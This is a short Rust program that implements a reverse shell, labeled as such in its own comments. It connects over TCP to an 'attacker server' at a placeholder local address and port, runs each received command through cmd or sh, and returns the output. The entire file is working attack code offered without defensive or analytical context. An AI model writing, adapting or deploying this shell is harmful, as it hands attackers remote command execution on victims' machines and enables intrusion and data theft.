use tokio::net::TcpStream;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader, BufWriter};
use std::error::Error;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error + Send + Sync>> {
    // Connect to the attacker server (reverse shell)
    let stream = TcpStream::connect("127.0.0.1:4444").await?;
    let (reader, writer) = stream.into_split();
    let mut reader = BufReader::new(reader);
    let mut writer = BufWriter::new(writer);

    loop {
        // Receive the command from the server
        let mut command = String::new();
        reader.read_line(&mut command).await?;

        // If command is empty, terminate connection
        if command.trim().is_empty() {
            break;
        }

        // Execute the received command and send the result back to the server
        let output = execute_command(&command.trim()).await?;
        writer.write_all(output.as_bytes()).await?;
        writer.flush().await?;
    }

    Ok(())
}

// Execute the command received from the attacker
async fn execute_command(command: &str) -> Result<String, String> {
    let output = if cfg!(target_os = "windows") {
        std::process::Command::new("cmd")
            .args(&["/C", command])
            .output()
            .map_err(|e| e.to_string())?
    } else {
        std::process::Command::new("sh")
            .arg("-c")
            .arg(command)
            .output()
            .map_err(|e| e.to_string())?
    };

    // Return the output of the command
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}
